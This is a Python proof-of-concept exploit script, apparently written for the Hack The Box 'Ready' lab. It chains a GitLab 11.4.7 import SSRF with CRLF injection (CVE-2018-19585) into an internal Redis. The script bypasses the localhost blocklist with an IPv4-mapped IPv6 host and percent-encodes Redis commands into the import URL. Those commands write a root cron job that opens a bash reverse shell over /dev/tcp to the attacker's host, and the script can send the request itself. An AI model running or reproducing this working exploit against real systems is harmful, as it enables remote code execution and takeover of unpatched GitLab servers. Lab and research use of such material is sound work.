#!/usr/bin/env python3
"""
HTB Ready — GitLab 11.4.7 import SSRF + CRLF injection into internal Redis (CVE-2018-19585)
Source: ready.txt   |   Arsenal refs: §4.2, §12.3

Fills the gap flagged in the arsenal ("the exact final Redis command set used there
should be read from the file"). This builds the complete, encoded request and the full
RESP command set, and can fire it at a GitLab instance you have an account on.

Two stages:
  1. Reachability — the import URL points at Redis; a listener on your side shows the
     git-upload-pack handshake, proving the SSRF filter (which only blocks the literal
     127.0.0.1) was bypassed with the IPv4-mapped IPv6 form.
  2. Injection — append %0d%0a + RESP lines so Redis executes them.

Usage:
    # print the URL and RESP lines only
    ./poc_htb_ready_redis_crlf.py --gen --lhost 10.10.14.5 --lport 4444

    # reachability check against your own listener
    ./poc_htb_ready_redis_crlf.py --gitlab http://ready.htb --token <PAT> \
        --ssrf-host 10.10.14.5 --ssrf-port 80

    # deliver the cron write to Redis
    ./poc_htb_ready_redis_crlf.py --gitlab http://ready.htb --token <PAT> \
        --lhost 10.10.14.5 --lport 4444 --send

Note: the path component must be percent-encoded. GitLab decodes the URL once before
handing it to the HTTP client, so %0d%0a becomes a real CRLF inside the Redis session.
"""

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request


def redis_cron_lines(lhost, lport):
    """RESP for a Redis -> cron.d RCE. Returns list of raw RESP strings (no encoding)."""
    cron = "\\n\\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\\n\\n" % (lhost, lport)
    return [
        'set 1 "%s"' % cron,
        "config set dir /var/spool/cron",
        "config set dbfilename root",
        "save",
    ]


def redis_auth_lines(password):
    return ["auth %s" % password] if password else []


def to_resp(lines, separator="\n"):
    """Join RESP lines with a line separator (\\n works; Redis tolerates it)."""
    return separator.join(lines) + separator


def build_url(redis_host, redis_port, resp_blob, host_form="mapped"):
    """Compose the SSRF URL with the CRLF-escaped Redis payload as the path."""
    if host_form == "mapped":
        netloc = "[0:0:0:0:0:ffff:%s]:%d" % (redis_host, redis_port)
    else:
        netloc = "%s:%d" % (redis_host, redis_port)
    encoded = urllib.parse.quote(resp_blob, safe="")
    return "http://%s/%s" % (netloc, encoded)


def gitlab_import(args, import_url):
    """Trigger the import so GitLab fetches our crafted URL."""
    endpoint = args.gitlab.rstrip("/") + "/import/gitlab_project"
    body = urllib.parse.urlencode(
        {
            "namespace_id": args.namespace,
            "import_url": import_url,
            "path": args.path,
            "name": args.path,
        }
    ).encode()
    req = urllib.request.Request(endpoint, data=body, method="POST")
    req.add_header("PRIVATE-TOKEN", args.token)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=args.timeout) as resp:
            return resp.status, resp.read(4000).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(4000).decode("utf-8", "replace")
    except urllib.error.URLError as exc:
        return None, "connect failed: %s" % exc.reason


def main(argv=None):
    p = argparse.ArgumentParser(description="Ready: GitLab import SSRF -> Redis CRLF injection")
    p.add_argument("--gitlab", help="e.g. http://ready.htb")
    p.add_argument("--token", help="GitLab private token (PRIVATE-TOKEN header)")
    p.add_argument("--namespace", type=int, default=1)
    p.add_argument("--path", default="redisexploit")
    p.add_argument("--redis-host", default="127.0.0.1")
    p.add_argument("--redis-port", type=int, default=6379)
    p.add_argument("--redis-pass", default="")
    p.add_argument("--lhost", default="10.10.14.5", help="callback IP for the cron payload")
    p.add_argument("--lport", default="4444")
    p.add_argument("--ssrf-host", help="reachability stage: host your listener is on")
    p.add_argument("--ssrf-port", type=int, default=80)
    p.add_argument("--host-form", choices=("mapped", "plain"), default="mapped",
                   help="mapped = [::ffff:127.0.0.1] blocklist bypass (default)")
    p.add_argument("--timeout", type=float, default=20.0)
    p.add_argument("--gen", action="store_true", help="print only, do not send")
    p.add_argument("--send", action="store_true", help="actually trigger the import")
    args = p.parse_args(argv)

    if args.ssrf_host:
        check = "git://%s:%d/test/.git" % (args.ssrf_host, args.ssrf_port)
        print("[*] reachability import_url (watch your listener for 'git-upload-pack'):")
        print("    %s" % check)
        if not args.send:
            return 0
        url = check
    else:
        lines = redis_auth_lines(args.redis_pass) + redis_cron_lines(args.lhost, args.lport)
        blob = to_resp(lines)
        url = build_url(args.redis_host, args.redis_port, blob, args.host_form)
        print("[*] RESP payload delivered into the URL path:")
        for line in lines:
            print("    %s" % line)
        print("\n[*] final import_url (%d bytes):\n%s\n" % (len(url), url))
        if args.gen or not args.send:
            print("[i] add --send to submit it. A 500/timeout from GitLab is expected;")
            print("    check whether /var/spool/cron/root now contains your job.")
            return 0

    if not args.gitlab or not args.token:
        print("[-] --gitlab and --token are required with --send", file=sys.stderr)
        return 2

    status, body = gitlab_import(args, url)
    print("[*] POST %s/import/gitlab_project -> %s" % (args.gitlab, status))
    if body:
        print(body[:600])
    if status in (200, 201, 302):
        print("[+] import accepted — verify the callback / cron file on the target")
    else:
        print("[!] non-success status; GitLab may reject the scheme or the URL length")
    return 0


if __name__ == "__main__":
    sys.exit(main())
